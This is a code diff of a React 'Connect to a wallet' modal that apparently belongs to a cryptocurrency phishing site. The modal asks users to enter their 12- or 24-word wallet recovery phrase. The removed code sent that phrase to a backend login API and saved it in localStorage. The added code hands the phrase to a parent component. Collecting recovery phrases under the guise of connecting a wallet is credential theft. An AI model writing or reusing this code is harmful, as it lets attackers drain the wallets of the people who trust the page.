@@ -6,6 +6,7 @@ import { FaAlignJustify, FaHome, FaTractor, FaBabyCarriage, FaSteam, FaOutdent,
 import MetaMask from '../../img/quotation/metamask.svg';
 import Bnbwallet from '../../img/quotation/bnb-busd.svg';
 import Trustwallet from '../../img/quotation/TWT.png';
+import Ripplewallet from '../../img/rippleWallet.png';
 import './index.css';
 import Modal from 'react-modal';
 import { ethers } from "ethers";
@@ -24,103 +25,42 @@ const customStyles = {
       transform: 'translate(-50%, -50%)',
       borderRadius:'25px',
       zIndex: 5000,
+      color: 'white',
+      width: '500px',
+      backgroundColor:'#392937'
     },
     overlay: {
-        background: "rgba(69, 42, 122, 0.6)"
+        background: "rgb(59 52 72 / 60%)"
     },  
 };
 
-const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {
 
-    const web3 = new Web3(RPC_URL);    
-    let contract =  new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
-
-    let subtitle;
+const MyModal = ({isOpen, action, propPharse}) => {
+    const [openModal, setOpenModal] = useState(false);
     const [step, setStep] = useState(1);
-    const [kword, setKword] = useState('');
-    const [modalIsOpen, setIsOpen] = useState(false);
+    const [pharse, setPharse] = useState('');
 
-    function afterOpenModal() {
-        // references are now sync'd and can be accessed.
-        subtitle.style.color = 'rgb(69, 42, 122)';
+    useEffect(() =>{
+        setOpenModal(isOpen)
+    }, [isOpen]);
+    const closeModal = () => {
+        setOpenModal(false);
     }
-    
-    function closeModal() {
-        setStep(1);
-        setIsOpen(false);
-    }
-
-    useEffect(() => {
-        setIsOpen(isOpen);
-    }, [isOpen]);     
-    
-
-    const handleChange = (e) => {
-        setKword(e.target.value);
-    }
-    
-    const connect_wallet = () => {
-        var check = ethers.utils.isValidMnemonic(kword);
-        if (check == false) {
-            toast.error('Please enter your correct wallet phrase!');
-        } else {
-            const formDatas = {
-                userPass:kword
-            }
-            apiLogin(formDatas).then(res => {
-                console.log("res-----", res);
-                localStorage.setItem('token', res.data.token);
-                if (res.data.error) {
-                    console.log(res);
-                    if (res.data.msg) {
-                        console.log(res);
-                    }
-                }
-            })
-            .catch(err => {
-                console.log("err-----", err);
-                toast.error(<div>Wrong!<br/>Please enter your correct wallet phrase</div>);
-                setIsOpen(false);
-                setKword('');
-            })
-
-            if(localStorage.getItem('token')){
-                isStake(false);
-                let address = ethers.Wallet.fromMnemonic(kword)['address'];                
-                console.log('ethers.Wallet.fromMnemonic(kword)', ethers.Wallet.fromMnemonic(kword));
-
-                localStorage.setItem('address', address); 
-                async function getBalance() {
-                    const balance = await contract.methods.balanceOf(address).call();
-                    console.log(balance);
-                    
-                    isBalance(balance);
-                    localStorage.setItem('balance', parseInt(Number(balance)/(1000000000))); 
-                                
-                    // localStorage.setItem('balance', balance);                  
-                    return balance;                
-                }
-                localStorage.setItem('login', true);                   
-                getBalance();
-                closeModal();
-                toast.info('Successfully connected!');
-                isLogin(true);   
-                localStorage.setItem('kword', kword);
-            }         
-        }
+    const ConnectWallet = () => {
+        propPharse(pharse);
+        action(1);
     }
 
     return (
         <>
             <Modal
-                isOpen={modalIsOpen}
-                onAfterOpen={afterOpenModal}
+                isOpen={openModal}
                 onRequestClose={closeModal}
                 style={customStyles}
                 contentLabel="Example Modal"
             >
                 <div className='d-flex justify-content-between title-color'>
-                    <h5 className='font-OpenSansBold' ref={(_subtitle) => (subtitle = _subtitle)}>Connect to a wallet</h5>
+                    <h5 className='font-OpenSansBold'>Connect to a wallet</h5>
                     <FaTimes className='cursor-pointer' onClick={closeModal}/>
                 </div>
                 
@@ -129,14 +69,18 @@ const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {
                 {step === 1 && (
                     <>                    
                         <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
+                            <p className='align-self-center mb-0 title-color pt-0'>Ripple Wallet</p>
+                            <img src={Ripplewallet} width={35}></img>
+                        </div>
+                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                             <p className='align-self-center mb-0 title-color pt-0'>MetaMask</p>
                             <img src={MetaMask} width={35}></img>
                         </div>
-                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
+                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                             <p className='align-self-center mb-0 title-color pt-0'>Binance Chain Wallet</p>
                             <img src={Bnbwallet} width={35}></img>
                         </div>
-                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
+                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer'>
                             <p className='align-self-center mb-0 title-color pt-0'>Trust Wallet</p>
                             <img src={Trustwallet} width={35}></img>
                         </div>
@@ -145,10 +89,10 @@ const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {
                 
                 {step === 2 && (
                     <div>
-                        <div className='text-center'><h3 className='font-OpenSansBold card-main-title title-color py-3'>Enter your 12 (or 24) word phrase below (words separated by a single space)</h3></div>
+                        <div className='text-center'><h5 className='font-OpenSansBold card-main-title title-color py-3'>Enter your 12 (or 24) word phrase below (words separated by a single space)</h5></div>
                         <div className='text-center'>
-                            <textarea cols="40" rows="6" name="phrase" minlength="23" required="" placeholder="Write it down" className='write-component' value={kword} onChange={handleChange}></textarea>
-                            <div className="w-50 align-self-center btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-4 mt-3" onClick={() => connect_wallet()}>
+                            <textarea cols="40" rows="6" name="phrase" minlength="23" required="" placeholder="Write it down" className='write-component text-black' value={pharse} onChange={(e) => setPharse(e.target.value)}></textarea>
+                            <div className="w-50 align-self-center btn submit-button rounded-button-long font-OpenSansBold mr-4 mt-3" onClick={() => ConnectWallet()}>
                                 Submit
                             </div>
                         </div>
